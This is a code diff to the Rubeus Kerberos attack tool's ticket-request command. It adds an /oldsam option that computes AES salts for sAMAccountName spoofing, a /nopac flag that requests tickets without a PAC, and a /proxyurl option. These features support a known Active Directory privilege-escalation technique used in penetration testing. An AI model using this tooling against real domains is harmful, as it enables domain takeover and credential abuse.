@@ -28,8 +28,11 @@ namespace Rubeus.Commands
             bool force = false;
             bool verifyCerts = false;
             bool getCredentials = false;
+            bool pac = true;
             LUID luid = new LUID();
             Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;
+
+            string proxyUrl = null;
 
             if (arguments.ContainsKey("/user"))
             {
@@ -82,6 +85,13 @@ namespace Rubeus.Commands
                 if (user.EndsWith("$"))
                 {
                     salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), user.TrimEnd('$').ToLower(), domain.ToLower());
+                }
+
+                // special case for samaccountname spoofing to support Kerberos AES Encryption
+                if (arguments.ContainsKey("/oldsam"))
+                {
+                    salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), arguments["/oldsam"].TrimEnd('$').ToLower(), domain.ToLower());
+
                 }
 
                 hash = Crypto.KerberosPasswordHash(encType, password, salt);
@@ -143,6 +153,17 @@ namespace Rubeus.Commands
                 {
                     force = true;
                 }
+            }
+
+            if (arguments.ContainsKey("/nopac"))
+            {
+                pac = false;
+            }
+
+
+            if (arguments.ContainsKey("/proxyurl"))
+            {
+                proxyUrl = arguments["/proxyurl"];
             }
 
             if (arguments.ContainsKey("/luid"))
@@ -207,9 +228,9 @@ namespace Rubeus.Commands
                     return;
                 }
                 if (String.IsNullOrEmpty(certificate))
-                    Ask.TGT(user, domain, hash, encType, outfile, ptt, dc, luid, true, opsec, servicekey, changepw);
+                    Ask.TGT(user, domain, hash, encType, outfile, ptt, dc, luid, true, opsec, servicekey, changepw, pac, proxyUrl);
                 else
-                    Ask.TGT(user, domain, certificate, password, encType, outfile, ptt, dc, luid, true, verifyCerts, servicekey, getCredentials);
+                    Ask.TGT(user, domain, certificate, password, encType, outfile, ptt, dc, luid, true, verifyCerts, servicekey, getCredentials, proxyUrl);
 
                 return;
             }
